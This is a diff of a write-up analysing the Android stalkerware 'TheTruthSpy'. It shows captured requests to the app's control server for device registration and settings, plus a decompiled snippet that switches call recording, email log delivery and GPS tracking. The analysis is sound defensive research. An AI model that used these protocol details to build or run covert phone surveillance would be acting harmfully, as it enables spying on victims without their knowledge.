@@ -1,6 +1,10 @@
 ## Dissection of an infection, 'TheTruthSpy'.
 
-This will be an indepth look at what happens immediately after installation of 'TheTruthSpy', both on the Android phone and over the network.
+This will be an indepth look at what happens immediately after installation of 'TheTruthSpy', both on the Android phone itself and over the network.
+
+Imeediately after the apk installation the app contacts the control server and transmits the 16 character hex value of the device's 'Secure Android ID'. 'Secure Android ID' is used by TheTruthSpy as an identifier for victim's devices, it is a 64-bit number that is generated randomly when the Android device is first booted. 
+
+Below we can see this initial request and the response that the deviceid is not currently registered with TheTruthSpy.
 
 ```
 GET /protocols/check_device_registered.aspx?deviceid=d4bc-803e-25f0-8913 HTTP/1.1
@@ -21,6 +25,8 @@ Date: Thu, 17 Jan 2019 15:34:36 GMT
 The device does not exist in the system.
 ```
 
+The app then registers the phone with the email address and password provided by the user, along with the deviceid, the server responds that it has received this information.
+
 ```
 GET /protocols/device_register.aspx?username=emillio.esneider@plutocow.com&password=p4ssw0rd&deviceid=d4bc-803e-25f0-8913 HTTP/1.1
 Host: protocol-a810.thetruthspy.com
@@ -38,6 +44,8 @@ Date: Thu, 17 Jan 2019 16:03:40 GMT
 
 1
 ```
+
+The app then contacts getsetting.aspx, sending the deviceid, current time and operating system. It then receives back an initial configuration which details the last recorded instance of various recorded events, the email address to send updates to and a lot of configuration information in the format <*#>, with digits following the hash detailing various options.
 
 ```
 POST /protocols/getsetting.aspx HTTP/1.1
@@ -67,6 +75,34 @@ tango=2018-11-17 23:03:52;wechat=2018-11-17 23:03:52;ola=2018-11-17 23:03:52;han
 bbm=2018-11-17 23:03:52;line=2018-11-17 23:03:52;kik=2018-11-17 23:03:52;twitter=2018-11-17 23:03:52;
 instagram=2018-11-17 23:03:52;snapchat=2018-11-17 23:03:52>,delivery-logs-to-email=emillio.esneider@plutocow.com
 ```
+
+Decoding the configuration above is a little lengthy, but performing static analysis on TheTruthSpy.apk we can see what some of these options correspond to. 
+
+                            ```
+                } else {
+                    if (!stringBuilder2.equals("<*#4>")) {
+                        if (!stringBuilder2.equals("<*#3>")) {
+                            if (stringBuilder2.equals("<*#84>")) {
+                                edit.putBoolean("delivery_log_by_email_active", false);
+                            } else if (stringBuilder2.equals("<*#83>")) {
+                                edit.putBoolean("delivery_log_by_email_active", true);
+                            } else if (stringBuilder2.equals("<*#7>")) {
+                                edit.putBoolean("is_record_call_active", true);
+                            } else if (stringBuilder2.equals("<*#8>")) {
+                                edit.putBoolean("is_record_call_active", false);
+                            } else if (stringBuilder2.equals("<*#30>")) {
+                                stringBuilder2 = split2[1].substring(1, split2[1].length()).trim();
+                                trim = split2[2].substring(1, split2[2].length()).trim();
+                                if (stringBuilder2.length() <= 0 || trim.length() <= 0) {
+                                    edit.putLong("gps_distance_filter", 200);
+                                } else {
+                                    edit.putLong("gps_distance_filter", Long.parseLong(stringBuilder2));
+                                }
+                                ```
+
+So we can see that call recording is off, there is no "monitor number" configured for covert phone calls to eavesdrop and the delivery of logs by email is disabled also that gps_distance_filter is set to only send updates if the phone moves over 500 meters. There are many, many more configuration options shown, explaining them all is beyond the scope of this document.
+
+The next post (below) to setsetting.aspx is transmitting the following string, URL encoded 'deviceid=d4bc-803e-25f0-8913&clienttime=2019-01-17 08:03:58&t=1&country=us¶ms=<*#11>,<*#13>,<*#68>,<*#58>,<*#76>,<*#15>,<*#21>,<*#52>,<*#56>,<*#60>,<*#31><15>,<*#31><30>,<*#94><#2013*>,<*#95><>,<*#97><>,<*#98><Full Android on Emulator>,<*#99><357242043237511>&os=Android 4.1.1#8.10'
 
 ```
 POST /protocols/setsetting.aspx HTTP/1.1
